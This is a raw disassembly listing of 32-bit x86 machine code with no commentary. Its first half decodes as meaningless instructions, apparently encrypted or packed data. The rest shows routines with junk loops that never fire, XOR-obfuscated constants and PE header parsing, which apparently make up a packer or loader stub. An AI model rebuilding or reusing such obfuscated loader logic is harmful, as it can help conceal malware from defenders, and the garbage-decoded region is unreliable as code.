  413866:	push   ecx
  413867:	(bad)  
  413868:	bound  esi,QWORD PTR [edx]
  41386a:	es ror bl,0xdf
  41386e:	dec    ebx
  41386f:	xchg   ebp,eax
  413870:	rcl    BYTE PTR [ebx],1
  413872:	xchg   DWORD PTR [ecx+ecx*1+0x355c67df],ecx
  413879:	or     eax,0x8142f3f6
  41387e:	ins    DWORD PTR es:[edi],dx
  41387f:	in     al,0x8e
  413881:	jbe    0x4138bf
  413883:	sub    ecx,DWORD PTR [eax+0x7b]
  413886:	fwait
  413887:	mov    al,0x30
  413889:	adc    eax,0x57c4abc4
  41388e:	dec    esp
  41388f:	outs   dx,DWORD PTR ds:[esi]
  413890:	fild   QWORD PTR [ebx]
  413892:	ja     0x41387b
  413894:	inc    ecx
  413895:	bound  eax,QWORD PTR ds:[esi+0x4f]
  413899:	jne    0x41385a
  41389b:	xchg   ecx,eax
  41389c:	push   ebx
  41389d:	fsubr  st(6),st
  41389f:	mov    bh,dl
  4138a1:	mov    ds,ecx
  4138a3:	es mov ecx,edx
  4138a6:	into   
  4138a7:	lds    ebx,FWORD PTR [esi]
  4138a9:	lahf   
  4138aa:	xchg   esi,eax
  4138ab:	data16 test al,0x5f
  4138ae:	pop    eax
  4138af:	test   BYTE PTR [esi],dh
  4138b1:	leave  
  4138b2:	cmp    eax,0x6adeeab4
  4138b7:	dec    esp
  4138b8:	out    dx,eax
  4138b9:	mov    esp,ecx
  4138bb:	mov    ecx,edi
  4138bd:	jbe    0x41389b
  4138bf:	inc    ebp
  4138c0:	sbb    DWORD PTR [esi+0x6d],0xffffffef
  4138c4:	and    ch,dh
  4138c6:	mov    ch,0xc9
  4138c8:	fbld   TBYTE PTR [edx-0x2e379efa]
  4138ce:	mov    ch,0x7
  4138d0:	fucomp st(3)
  4138d2:	sahf   
  4138d3:	pop    DWORD PTR [edi]
  4138d5:	lds    eax,FWORD PTR [eax+0x37fe8efb]
  4138db:	inc    ecx
  4138dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138dd:	cmp    DWORD PTR [edx+0x3b],esi
  4138e0:	push   ebp
  4138e1:	mov    eax,ds:0x4300e745
  4138e6:	mov    cl,0xd9
  4138e8:	mov    ebx,0x54aa2dcc
  4138ed:	mov    cl,BYTE PTR [edi]
  4138ef:	mov    edx,0xf601bfc2
  4138f4:	test   DWORD PTR [esi+edi*2],edi
  4138f7:	pop    ss
  4138f8:	or     DWORD PTR ds:0xae0a0c57,ebx
  4138fe:	push   ss
  4138ff:	scas   eax,DWORD PTR es:[edi]
  413900:	and    al,cl
  413902:	dec    DWORD PTR [edx+0x146c4b28]
  413908:	sub    dl,ah
  41390a:	dec    ecx
  41390b:	mov    ebp,0x51e3134c
  413910:	xor    dh,BYTE PTR [edi-0x7e0d136d]
  413916:	push   0xffffffb5
  413918:	outs   dx,DWORD PTR ds:[esi]
  413919:	pop    eax
  41391a:	repnz iret 
  41391c:	fnstsw WORD PTR [ebx+0x7cf6fa94]
  413922:	add    BYTE PTR [ebx],al
  413924:	int    0x94
  413926:	test   BYTE PTR ds:[edx-0x1a],dh
  41392a:	cmp    BYTE PTR [edx],bl
  41392c:	repnz push esi
  41392e:	(bad)  
  41392f:	fsubr  DWORD PTR [ebx+0x6f]
  413932:	jge    0x4138db
  413934:	mov    ds:0x55d869af,al
  413939:	sub    ah,dh
  41393b:	cdq    
  41393c:	xchg   esi,eax
  41393d:	ret    0xbb7a
  413940:	jo     0x413936
  413942:	daa    
  413943:	loopne 0x4138cb
  413945:	(bad)  
  413946:	retf   0xeb41
  413949:	mov    esi,0x491b0009
  41394e:	push   es
  41394f:	test   BYTE PTR [ebx-0x5ed7167d],al
  413955:	add    dl,BYTE PTR [ecx]
  413957:	out    0x21,al
  413959:	call   0xe6c2:0x7cf54426
  413960:	dec    eax
  413961:	xchg   esp,eax
  413962:	and    ebp,ebp
  413964:	ja     0x4139a0
  413966:	mov    WORD PTR [ecx],es
  413968:	rol    DWORD PTR [esi],0x16
  41396b:	push   ebx
  41396c:	lods   eax,DWORD PTR ds:[esi]
  41396d:	mov    dl,0x28
  41396f:	test   eax,0x90c8a75f
  413974:	jns    0x4138fa
  413976:	adc    esp,esi
  413978:	cli    
  413979:	in     al,dx
  41397a:	add    al,0x7f
  41397c:	mov    eax,0x339f120d
  413981:	call   0x4225cc79
  413986:	jle    0x413998
  413988:	add    DWORD PTR [esi-0x7d6f5ce6],0xeeb0866b
  413992:	lea    esp,[ecx]
  413994:	ror    DWORD PTR [ebp+0x67],1
  413997:	jbe    0x4139b5
  413999:	lods   al,BYTE PTR ds:[esi]
  41399a:	xor    eax,0xfeec39d9
  41399f:	xor    BYTE PTR [ecx],cl
  4139a1:	mov    bl,BYTE PTR [eax+edi*1+0x7f6bd9ee]
  4139a8:	call   0xe241ae62
  4139ad:	sbb    DWORD PTR [esi+0x7e],ebx
  4139b0:	jl     0x413936
  4139b2:	retf   
  4139b3:	hlt    
  4139b4:	outs   dx,BYTE PTR gs:[esi]
  4139b6:	mov    dl,0x89
  4139b8:	add    BYTE PTR [esi],cl
  4139ba:	fidiv  WORD PTR [ebx-0x49]
  4139bd:	mov    bl,0x4b
  4139bf:	test   ah,bh
  4139c1:	sub    BYTE PTR [edx+0x35],0x15
  4139c5:	(bad)
  4139c9:	jo     0x413977
  4139cb:	jg     0x4139b4
  4139cd:	pop    es
  4139ce:	sbb    al,BYTE PTR [esp+esi*2+0x4ddaa22a]
  4139d5:	loope  0x413a42
  4139d7:	xor    ecx,DWORD PTR [eax]
  4139d9:	push   ebx
  4139da:	fs sbb al,0xa4
  4139dd:	stos   DWORD PTR es:[edi],eax
  4139de:	pop    ss
  4139df:	adc    al,0xd3
  4139e1:	cmc    
  4139e2:	push   ebp
  4139e3:	xchg   ebx,eax
  4139e4:	rcl    BYTE PTR [esi],cl
  4139e6:	test   al,0x11
  4139e8:	retf   
  4139e9:	shr    esi,1
  4139eb:	jne    0x413985
  4139ed:	rcl    BYTE PTR [edi],cl
  4139ef:	cmp    al,0x6c
  4139f1:	xchg   BYTE PTR [edi+0x6e],al
  4139f4:	repz add eax,0xe5adf658
  4139fa:	push   esp
  4139fb:	and    BYTE PTR [edi+0x7baa181b],ah
  413a01:	jmp    0x51d0:0xec20231c
  413a08:	push   ss
  413a09:	mov    cl,0x76
  413a0b:	and    eax,0xf7c8fc10
  413a10:	sar    BYTE PTR [ebp-0x8],1
  413a13:	push   ebx
  413a14:	or     eax,0x2665aa86
  413a19:	mov    ds:0x508d62fe,al
  413a1e:	mov    ch,0x1c
  413a20:	mov    eax,ds:0x8e88c31f
  413a25:	dec    edx
  413a26:	out    0x5b,eax
  413a28:	mov    WORD PTR [ecx+ecx*8],ss
  413a2b:	and    edx,ebx
  413a2d:	adc    BYTE PTR [ebx],bh
  413a2f:	jo     0x4139d9
  413a31:	sub    eax,0x273bda49
  413a36:	(bad)  
  413a37:	and    esp,DWORD PTR [ebp-0x3f]
  413a3a:	or     esi,esp
  413a3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a3d:	retf   
  413a3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a3f:	sahf   
  413a40:	(bad)  
  413a41:	(bad)  
  413a42:	(bad)  
  413a43:	out    0x85,eax
  413a45:	in     eax,0x69
  413a47:	xor    DWORD PTR [edi],esp
  413a49:	xlat   BYTE PTR ds:[ebx]
  413a4a:	push   cs
  413a4b:	mov    ecx,0x6f7f1042
  413a50:	stos   DWORD PTR es:[edi],eax
  413a51:	dec    eax
  413a52:	sbb    ecx,DWORD PTR [edi]
  413a54:	shl    DWORD PTR [esi+0x7ca1eeeb],cl
  413a5a:	inc    ebx
  413a5b:	jnp    0x413a2f
  413a5d:	not    DWORD PTR [edi+esi*8]
  413a60:	xor    DWORD PTR [ebp-0x5c],edx
  413a63:	mov    dl,0xfa
  413a65:	mov    DWORD PTR [edi+0x2f460893],ebx
  413a6b:	sbb    DWORD PTR [ecx+ebp*2-0x80],esi
  413a6f:	jbe    0x4139f5
  413a71:	fisub  WORD PTR [edx]
  413a73:	stc    
  413a74:	je     0x413a5f
  413a76:	mov    ch,0x52
  413a78:	das    
  413a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a7a:	jp     0x413a2f
  413a7c:	ins    DWORD PTR es:[edi],dx
  413a7d:	cmp    BYTE PTR [esi+0x6d],0x1e
  413a81:	cmp    dh,bl
  413a83:	loop   0x413acf
  413a85:	sbb    edi,DWORD PTR [esp+ecx*1]
  413a88:	sub    BYTE PTR [ebx-0x303ace65],bh
  413a8e:	aam    0x69
  413a90:	int    0x6d
  413a92:	pop    ss
  413a93:	mov    BYTE PTR [ebx+0x47],dh
  413a96:	fdiv   st(7),st
  413a98:	xchg   esi,esi
  413a9a:	rol    BYTE PTR [ecx],cl
  413a9c:	in     eax,0xc2
  413a9e:	sti    
  413a9f:	add    edi,eax
  413aa1:	xor    bh,cl
  413aa3:	stc    
  413aa4:	mov    eax,ds:0xd08c1760
  413aa9:	cmp    ch,BYTE PTR [ecx-0x16]
  413aac:	add    al,BYTE PTR [esi-0x67d525cc]
  413ab2:	sub    DWORD PTR [ecx+edx*2],edi
  413ab5:	mov    eax,0x1bc50365
  413aba:	xchg   ebp,eax
  413abb:	fbstp  TBYTE PTR [eax]
  413abd:	dec    edi
  413abe:	or     ebx,ecx
  413ac0:	cdq    
  413ac1:	or     al,ah
  413ac3:	mov    dl,0x0
  413ac5:	mov    edi,0x9a9a0ee4
  413aca:	repnz cmp dh,ah
  413acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ace:	pop    ebp
  413acf:	sbb    al,0x43
  413ad1:	mov    ebx,0x214b47c9
  413ad6:	pop    ebp
  413ad7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ad8:	neg    esi
  413ada:	jge    0x413ac0
  413adc:	(bad)  
  413add:	and    bl,dl
  413adf:	lds    edi,FWORD PTR [esi]
  413ae1:	enter  0xb8a9,0xaa
  413ae5:	dec    edi
  413ae6:	cs push cs
  413ae8:	popf   
  413ae9:	ins    BYTE PTR es:[edi],dx
  413aea:	push   ebx
  413aeb:	push   ds
  413aec:	xor    BYTE PTR [edx-0x3e2c6681],dh
  413af2:	xchg   edi,eax
  413af3:	mov    tr5,ecx
  413af6:	sub    al,0x28
  413af8:	mov    cl,0x2a
  413afa:	xor    BYTE PTR [ecx],0xfa
  413afd:	or     al,0xf7
  413aff:	dec    esp
  413b00:	sbb    edi,esi
  413b02:	shl    BYTE PTR [ebx],0xda
  413b05:	pop    ebp
  413b06:	mov    BYTE PTR [ecx],dl
  413b08:	sub    al,0x49
  413b0a:	inc    ecx
  413b0b:	inc    esp
  413b0c:	pusha  
  413b0d:	pop    edx
  413b0e:	mov    DWORD PTR [eax],ecx
  413b10:	push   ecx
  413b11:	jle    0x413b78
  413b13:	stc    
  413b14:	sbb    ebp,DWORD PTR ds:0x815fe993
  413b1a:	fnstcw WORD PTR [esi+0x451d40c3]
  413b20:	xchg   BYTE PTR [edi+esi*2+0x53],dl
  413b24:	xlat   BYTE PTR ds:[ebx]
  413b25:	adc    BYTE PTR ds:0x82d7114,al
  413b2b:	sbb    DWORD PTR [ebp+ecx*8-0x580dfa78],ecx
  413b32:	mov    edx,0xbcb5c5dd
  413b37:	idiv   BYTE PTR [ebx+0x12]
  413b3a:	jns    0x413b09
  413b3c:	in     eax,0x90
  413b3e:	lods   eax,DWORD PTR ds:[esi]
  413b3f:	ror    DWORD PTR [edi+0x624d5a37],cl
  413b45:	mov    ebp,0x67629178
  413b4a:	xchg   ebp,eax
  413b4b:	test   DWORD PTR [ebp+0xd],esi
  413b4e:	inc    ecx
  413b4f:	sub    BYTE PTR [edx],ch
  413b51:	cs add eax,0xa5e177ac
  413b57:	sub    al,0x6e
  413b59:	pandn  mm7,QWORD PTR [edx]
  413b5c:	out    0x2d,eax
  413b5e:	cli    
  413b5f:	mov    ds:0x29a29158,al
  413b64:	gs inc esp
  413b66:	xchg   ebp,eax
  413b67:	dec    edx
  413b68:	call   0xdc55fc06
  413b6d:	xchg   ebp,eax
  413b6e:	jge    0x413b6c
  413b70:	popa   
  413b71:	sub    cl,0xc1
  413b74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b75:	pop    eax
  413b76:	imul   eax,ebp,0xffffffd3
  413b79:	imul   ebx,DWORD PTR [esi],0x88c87b0d
  413b7f:	and    BYTE PTR [edx+0x46c2e4af],cl
  413b85:	adc    ebx,DWORD PTR [edx]
  413b87:	enter  0x4788,0x7
  413b8b:	cmp    esp,DWORD PTR [ebp+ebp*2+0x18f088fc]
  413b92:	ret    
  413b93:	popf   
  413b94:	shr    DWORD PTR [esi-0x27],cl
  413b97:	xor    DWORD PTR [esi],ebx
  413b99:	jno    0x413bbe
  413b9b:	popf   
  413b9c:	outs   dx,DWORD PTR ds:[esi]
  413b9d:	mov    al,ds:0x706489d4
  413ba2:	dec    eax
  413ba3:	lds    ebx,FWORD PTR [ebx+0x1e317b55]
  413ba9:	pop    edi
  413baa:	gs (bad) 
  413bad:	ret    0xa5fb
  413bb0:	dec    DWORD PTR [eax+0x21e092a6]
  413bb6:	xchg   ebx,eax
  413bb7:	pop    ecx
  413bb8:	ds enter 0x6457,0x8e
  413bbd:	ins    DWORD PTR es:[edi],dx
  413bbe:	pop    edx
  413bbf:	outs   dx,DWORD PTR ds:[esi]
  413bc0:	aaa    
  413bc1:	mov    bl,0x9d
  413bc3:	mov    cl,0x63
  413bc5:	push   0x2c
  413bc7:	enter  0xb7cb,0xcf
  413bcb:	pop    ebp
  413bcc:	adc    al,0x0
  413bce:	xchg   ebp,eax
  413bcf:	push   edx
  413bd0:	int3   
  413bd1:	jb     0x413b62
  413bd3:	call   0x6cd2:0x4ae4766e
  413bda:	push   edx
  413bdb:	push   ebx
  413bdc:	dec    eax
  413bdd:	xchg   ebx,eax
  413bde:	jo     0x413c53
  413be0:	dec    ebx
  413be1:	ins    BYTE PTR es:[edi],dx
  413be2:	xchg   ecx,eax
  413be3:	pop    ebp
  413be4:	pop    esi
  413be5:	mov    ebx,0x3d046fb
  413bea:	rol    DWORD PTR [ebx-0x2fcc0029],1
  413bf0:	xor    edi,0x0
  413bf3:	cmp    edx,esi
  413bf5:	jne    0x413c0d
  413bfb:	cmp    edi,ebx
  413bfd:	jne    0x413c0d
  413c03:	mov    eax,ds:0x421c92
  413c08:	mov    ds:0x421c9a,eax
  413c0d:	pop    edi
  413c0e:	pop    esi
  413c0f:	pop    ebx
  413c10:	pop    ebp
  413c11:	ret    0x8
  413c14:	push   ebp
  413c15:	mov    ebp,esp
  413c17:	push   ecx
  413c18:	mov    eax,ds:0x421a62
  413c1d:	mov    eax,DWORD PTR [eax]
  413c1f:	add    DWORD PTR ds:0x42901c,eax
  413c25:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  413c2c:	mov    eax,DWORD PTR [ebp+0x8]
  413c2f:	adc    DWORD PTR ds:0x42a010,0x6bac
  413c39:	mov    al,BYTE PTR [eax]
  413c3b:	xor    DWORD PTR ds:0x42b018,0x428020
  413c45:	add    al,0xd
  413c47:	sbb    DWORD PTR ds:0x428004,0x428008
  413c51:	xor    al,0x6f
  413c53:	mov    DWORD PTR ds:0x428004,0x2e21
  413c5d:	cmp    al,0x35
  413c5f:	mov    DWORD PTR ds:0x42a00c,0x23cb
  413c69:	jne    0x413d26
  413c6f:	and    DWORD PTR ds:0x428024,0x429014
  413c79:	mov    eax,DWORD PTR [ebp+0x8]
  413c7c:	dec    edx
  413c7d:	mov    ecx,DWORD PTR [ebp+0x8]
  413c80:	and    edx,DWORD PTR ds:0x42b010
  413c86:	add    ecx,DWORD PTR [eax+0x3c]
  413c89:	mov    edx,0x7510893
  413c8e:	mov    DWORD PTR [ebp+0x8],ecx
  413c91:	and    DWORD PTR ds:0x42c008,0x0
  413c9b:	jmp    0x413cad
  413ca0:	mov    ecx,DWORD PTR ds:0x42c008
  413ca6:	inc    ecx
  413ca7:	mov    DWORD PTR ds:0x42c008,ecx
  413cad:	cmp    DWORD PTR ds:0x42c008,0x18
  413cb4:	jae    0x413cf8
  413cba:	cmp    DWORD PTR ds:0x42c008,0x9
  413cc1:	jne    0x413cd7
  413cc7:	push   0x429014
  413ccc:	push   0x5ace
  413cd1:	call   DWORD PTR ds:0x42403c
  413cd7:	cmp    DWORD PTR ds:0x42c008,0x8
  413cde:	jne    0x413cf3
  413ce4:	xor    ecx,ecx
  413ce6:	or     ecx,DWORD PTR ds:0x42c008
  413cec:	inc    ecx
  413ced:	mov    DWORD PTR ds:0x42c008,ecx
  413cf3:	jmp    0x413ca0
  413cf8:	mov    eax,DWORD PTR [ebp-0x4]
  413cfb:	xor    eax,edx
  413cfd:	push   esi
  413cfe:	mov    esi,DWORD PTR [ebp+0x8]
  413d01:	mov    ecx,0x3272db
  413d06:	add    eax,ecx
  413d08:	cmp    DWORD PTR [esi+0x54],eax
  413d0b:	pop    esi
  413d0c:	je     0x413d1a
  413d12:	mov    eax,DWORD PTR [ebp+0x8]
  413d15:	jmp    0x413d33
  413d1a:	mov    eax,DWORD PTR [ebp-0x4]
  413d1d:	xor    eax,edx
  413d1f:	add    eax,ecx
  413d21:	jmp    0x413d33
  413d26:	mov    eax,DWORD PTR [ebp-0x4]
  413d29:	xor    eax,0x7510893
  413d2e:	add    eax,0x3272db
  413d33:	leave  
  413d34:	ret    0x4
  413d37:	push   ebp
  413d38:	mov    ebp,esp
  413d3a:	sub    esp,0x18
  413d3d:	and    DWORD PTR ds:0x42901c,0x0
  413d47:	jmp    0x413d59
  413d4c:	mov    edx,DWORD PTR ds:0x42901c
  413d52:	inc    edx
  413d53:	mov    DWORD PTR ds:0x42901c,edx
  413d59:	cmp    DWORD PTR ds:0x42901c,0x1a
  413d60:	jae    0x413d92
  413d66:	cmp    DWORD PTR ds:0x42901c,0x22
  413d6d:	jne    0x413d83
  413d73:	push   0x8447
  413d78:	push   0x4238a8
  413d7d:	call   DWORD PTR ds:0x424040
  413d83:	jmp    0x413d4c
  413d88:	adc    DWORD PTR ds:0x42b010,0x42b00c
  413d92:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  413d99:	mov    ecx,DWORD PTR ds:0x421a2e
  413d9f:	mov    ecx,DWORD PTR [ecx]
  413da1:	and    DWORD PTR ds:0x42c01c,ecx
  413da7:	lea    eax,[ebp+0x14]
  413daa:	mov    DWORD PTR [ebp-0x4],eax
  413dad:	push   esi
  413dae:	and    DWORD PTR ds:0x428018,0x0
  413db8:	jmp    0x413dca
  413dbd:	mov    esi,DWORD PTR ds:0x428018
  413dc3:	inc    esi
  413dc4:	mov    DWORD PTR ds:0x428018,esi
  413dca:	cmp    DWORD PTR ds:0x428018,0x1a
  413dd1:	jae    0x413e9f
  413dd7:	cmp    DWORD PTR ds:0x428018,0x28
  413dde:	jne    0x413def
  413de4:	push   0x4238c3
  413de9:	call   DWORD PTR ds:0x424044
  413def:	jmp    0x413dbd
  413df4:	and    DWORD PTR ds:0x42c000,0x0
  413dfe:	mov    edx,DWORD PTR ds:0x42c000
  413e04:	inc    edx
  413e05:	mov    DWORD PTR ds:0x42c000,edx
  413e0b:	cmp    DWORD PTR ds:0x42c000,0x20
  413e12:	jne    0x413e2d
  413e18:	push   0x1ea1
  413e1d:	push   0x42b008
  413e22:	push   0x423986
  413e27:	call   DWORD PTR ds:0x424048
  413e2d:	cmp    DWORD PTR ds:0x42c000,0x11
  413e34:	jb     0x413dfe
  413e3a:	and    DWORD PTR ds:0x42b004,0x0
  413e44:	mov    edx,DWORD PTR ds:0x42b004
  413e4a:	inc    edx
  413e4b:	mov    DWORD PTR ds:0x42b004,edx
  413e51:	cmp    DWORD PTR ds:0x42b004,0xf
  413e58:	jne    0x413e6e
  413e5e:	push   0x428004
  413e63:	push   0x7cc5
  413e68:	call   DWORD PTR ds:0x424014
  413e6e:	cmp    DWORD PTR ds:0x42b004,0xe
  413e75:	jne    0x413e88
  413e7b:	mov    edx,DWORD PTR ds:0x42b004
  413e81:	inc    edx
  413e82:	mov    DWORD PTR ds:0x42b004,edx
  413e88:	cmp    DWORD PTR ds:0x42b004,0x1d
  413e8f:	jb     0x413e44
  413e95:	mov    DWORD PTR ds:0x428014,0x22a8
  413e9f:	mov    esi,0xf89c85b6
  413ea4:	and    DWORD PTR ds:0x428008,0x0
  413eae:	mov    edx,DWORD PTR ds:0x428008
  413eb4:	inc    edx
  413eb5:	mov    DWORD PTR ds:0x428008,edx
  413ebb:	cmp    DWORD PTR ds:0x428008,0x19
  413ec2:	jne    0x413ef2
  413ec8:	push   0x62e7
  413ecd:	push   0x428000
  413ed2:	push   0x75f3
  413ed7:	push   0x428000
  413edc:	push   DWORD PTR [ebp-0x24]
  413edf:	push   0x6458
  413ee4:	push   DWORD PTR [ebp-0x14]
  413ee7:	push   0x5743
  413eec:	call   DWORD PTR ds:0x424018
  413ef2:	cmp    DWORD PTR ds:0x428008,0x14
  413ef9:	jb     0x413eae
  413eff:	xor    ecx,ecx
  413f01:	add    ecx,DWORD PTR ds:0x429008
  413f07:	adc    DWORD PTR ds:0x42c00c,ecx
  413f0d:	mov    DWORD PTR [ebp-0xc],esi
  413f10:	lea    eax,[ebp-0xc]
  413f13:	dec    ecx
  413f14:	mov    DWORD PTR [ebp-0x14],eax
  413f17:	mov    eax,DWORD PTR [ebp-0xc]
  413f1a:	adc    ecx,0x29e6
  413f20:	mov    edx,DWORD PTR [ebp-0x14]
  413f23:	and    DWORD PTR ds:0x428018,0x0
  413f2d:	mov    ecx,DWORD PTR ds:0x428018
  413f33:	inc    ecx
  413f34:	mov    DWORD PTR ds:0x428018,ecx
  413f3a:	cmp    DWORD PTR ds:0x428018,0xb
  413f41:	jne    0x413f52
  413f47:	push   0x4faf
  413f4c:	call   DWORD PTR ds:0x42401c
  413f52:	cmp    DWORD PTR ds:0x428018,0xa
  413f59:	jne    0x413f6c
  413f5f:	mov    ecx,DWORD PTR ds:0x428018
  413f65:	inc    ecx
  413f66:	mov    DWORD PTR ds:0x428018,ecx
  413f6c:	cmp    DWORD PTR ds:0x428018,0x1e
  413f73:	jb     0x413f2d
  413f79:	inc    ecx
  413f7a:	mov    ecx,0x7510893
  413f7f:	neg    DWORD PTR ds:0x42a004
  413f85:	xor    eax,ecx
  413f87:	add    eax,0x3272db
  413f8c:	and    DWORD PTR ds:0x42c010,0x2759
  413f96:	mov    DWORD PTR [edx],eax
  413f98:	mov    edx,DWORD PTR ds:0x421a26
  413f9e:	mov    eax,ds:0x421a36
  413fa3:	sub    edx,eax
  413fa5:	and    edx,DWORD PTR [edx+eax*1]
  413fa8:	mov    eax,ds:0x421a8e
  413fad:	inc    DWORD PTR ds:0x42a01c
  413fb3:	mov    edx,DWORD PTR [ebp-0x4]
  413fb6:	and    DWORD PTR ds:0x42a018,0x7b9c
  413fc0:	mov    eax,DWORD PTR [eax]
  413fc2:	and    DWORD PTR ds:0x42c000,0x5f81
  413fcc:	add    eax,DWORD PTR [edx]
  413fce:	movzx  edx,BYTE PTR ds:0x42a014
  413fd5:	or     DWORD PTR ds:0x42a01c,edx
  413fdb:	push   edi
  413fdc:	add    DWORD PTR ds:0x42a004,edx
  413fe2:	mov    DWORD PTR [ebp-0x8],eax
  413fe5:	movzx  edx,WORD PTR ds:0x428004
  413fec:	sbb    DWORD PTR ds:0x42a01c,edx
  413ff2:	mov    edi,DWORD PTR [ebp+0x8]
  413ff5:	and    DWORD PTR ds:0x42b01c,0x631e
  413fff:	mov    eax,ds:0x421c16
  414004:	mov    eax,DWORD PTR [eax+0x198]
  41400a:	xor    edi,ecx
  41400c:	mov    DWORD PTR ds:0x428018,0x14
  414016:	cmp    DWORD PTR ds:0x428018,0x0
  41401d:	je     0x414070
  414023:	cmp    DWORD PTR ds:0x428018,0x3
  41402a:	jne    0x41403e
  414030:	push   DWORD PTR [ebp-0x28]
  414033:	push   0x77dc
  414038:	call   DWORD PTR ds:0x424020
  41403e:	cmp    DWORD PTR ds:0x428018,0x4
  414045:	jne    0x414058
  41404b:	mov    edx,DWORD PTR ds:0x428018
  414051:	dec    edx
  414052:	mov    DWORD PTR ds:0x428018,edx
  414058:	mov    edx,DWORD PTR ds:0x428018
  41405e:	dec    edx
  41405f:	mov    DWORD PTR ds:0x428018,edx
  414065:	jmp    0x414016
  41406a:	and    DWORD PTR ds:0x42c014,ecx
  414070:	mov    edx,0x3272db
  414075:	sbb    DWORD PTR ds:0x429008,0x451c
  41407f:	add    edi,edx
  414081:	mov    DWORD PTR ds:0x42a000,0x2432
  41408b:	cmp    DWORD PTR [eax],edi
  41408d:	je     0x41409a
  414093:	mov    eax,DWORD PTR [eax]
  414095:	jmp    0x41ae5c
  41409a:	mov    eax,DWORD PTR [ebp+0x18]
  41409d:	cmp    eax,esi
  41409f:	jne    0x4140b9
  4140a5:	mov    DWORD PTR ds:0x42a01c,0x2296
  4140af:	push   0xf89c85b5
  4140b4:	jmp    0x41ae4b
  4140b9:	mov    esi,DWORD PTR [ebp+0x18]
  4140bc:	mov    eax,0x2f4e
  4140c1:	mov    eax,0xf89c85b4
  4140c6:	cmp    esi,eax
  4140c8:	jne    0x41ae3b
  4140ce:	sbb    esi,esi
  4140d0:	mov    eax,DWORD PTR [ebp+0x10]
  4140d3:	mov    esi,DWORD PTR ds:0x42c008
  4140d9:	sbb    esi,DWORD PTR ds:0x42a008
  4140df:	mov    DWORD PTR ds:0x42c008,esi
  4140e5:	xor    eax,ecx
  4140e7:	mov    DWORD PTR ds:0x428000,0x1b
  4140f1:	cmp    DWORD PTR ds:0x428000,0x0
  4140f8:	je     0x414161
  4140fe:	cmp    DWORD PTR ds:0x428000,0x4
  414105:	jne    0x414135
  41410b:	push   0x42a000
  414110:	push   0x8ffd
  414115:	push   DWORD PTR [ebp-0x14]
  414118:	push   0x428014
  41411d:	push   0x2d9f
  414122:	push   0x423a00
  414127:	push   0x4cf3
  41412c:	push   DWORD PTR [ebp-0x1c]
  41412f:	call   DWORD PTR ds:0x424024
  414135:	cmp    DWORD PTR ds:0x428000,0x5
  41413c:	jne    0x41414f
  414142:	mov    esi,DWORD PTR ds:0x428000
  414148:	dec    esi
  414149:	mov    DWORD PTR ds:0x428000,esi
  41414f:	mov    esi,DWORD PTR ds:0x428000
  414155:	dec    esi
  414156:	mov    DWORD PTR ds:0x428000,esi
  41415c:	jmp    0x4140f1
  414161:	add    eax,edx
  414163:	mov    DWORD PTR [ebp-0x18],eax
  414166:	mov    eax,DWORD PTR [ebp+0xc]
  414169:	mov    esi,DWORD PTR [ebp-0x8]
  41416c:	xor    eax,ecx
  41416e:	add    eax,edx
  414170:	imul   eax,DWORD PTR [esi]
  414173:	mov    esi,DWORD PTR [ebp+0x8]
  414176:	xor    esi,ecx
  414178:	add    esi,edx
  41417a:	cmp    esi,eax
  41417c:	mov    eax,DWORD PTR [ebp-0x4]
  41417f:	push   ebx
  414180:	je     0x41419f
  414186:	mov    esi,DWORD PTR [ebp-0x18]
  414189:	add    DWORD PTR [eax],esi
  41418b:	mov    eax,DWORD PTR [ebp-0x4]
  41418e:	mov    esi,DWORD PTR [ebp+0xc]
  414191:	xor    esi,ecx
  414193:	add    esi,edx
  414195:	imul   esi,DWORD PTR [eax]
  414198:	mov    DWORD PTR [eax],esi
  41419a:	jmp    0x4141a4
  41419f:	mov    esi,DWORD PTR [ebp+0x14]
  4141a2:	xor    DWORD PTR [eax],esi
  4141a4:	mov    eax,DWORD PTR [ebp-0x4]
  4141a7:	mov    edi,DWORD PTR [ebp+0x10]
  4141aa:	xor    edi,ecx
  4141ac:	mov    esi,0xffcd8d25
  4141b1:	mov    ebx,esi
  4141b3:	sub    ebx,edi
  4141b5:	add    DWORD PTR [eax],ebx
  4141b7:	mov    eax,DWORD PTR [ebp-0x4]
  4141ba:	mov    edi,DWORD PTR [ebp-0x8]
  4141bd:	add    edi,DWORD PTR [eax]
  4141bf:	mov    DWORD PTR [ebp-0x8],edi
  4141c2:	mov    eax,DWORD PTR [ebp+0xc]
  4141c5:	mov    edi,DWORD PTR [ebp+0xc]
  4141c8:	xor    edi,ecx
  4141ca:	xor    eax,ecx
  4141cc:	lea    eax,[eax+edi*1+0x64e5b6]
  4141d3:	mov    edi,DWORD PTR [ebp+0xc]
  4141d6:	xor    edi,ecx
  4141d8:	add    edi,edx
  4141da:	imul   eax,edi
  4141dd:	mov    edi,DWORD PTR [ebp+0xc]
  4141e0:	xor    edi,ecx
  4141e2:	sub    edi,eax
  4141e4:	mov    eax,DWORD PTR [ebp-0x4]
  4141e7:	add    edi,edx
  4141e9:	cmp    DWORD PTR [eax],edi
  4141eb:	mov    eax,DWORD PTR [ebp-0x4]
  4141ee:	mov    edi,DWORD PTR [ebp+0x10]
  4141f1:	jg     0x414204
  4141f7:	xor    edi,ecx
  4141f9:	mov    ebx,esi
  4141fb:	sub    ebx,edi
  4141fd:	add    DWORD PTR [eax],ebx
  4141ff:	jmp    0x41420a
  414204:	xor    edi,ecx
  414206:	add    edi,edx
  414208:	add    DWORD PTR [eax],edi
  41420a:	mov    eax,DWORD PTR [ebp-0x8]
  41420d:	mov    edi,DWORD PTR [ebp-0x10]
  414210:	mov    eax,DWORD PTR [eax]
  414212:	xor    edi,ecx
  414214:	add    edi,0x3272da
  41421a:	not    edi
  41421c:	and    eax,edi
  41421e:	movsx  di,BYTE PTR [eax+0x1]
  414223:	mov    ebx,0x3b4b
  414228:	sub    di,bx
  41422b:	mov    ebx,0x8a85
  414230:	xor    di,bx
  414233:	mov    ebx,0x4f8a
  414238:	cmp    di,bx
  41423b:	jmp    0x4165fa
  414240:	out    dx,al
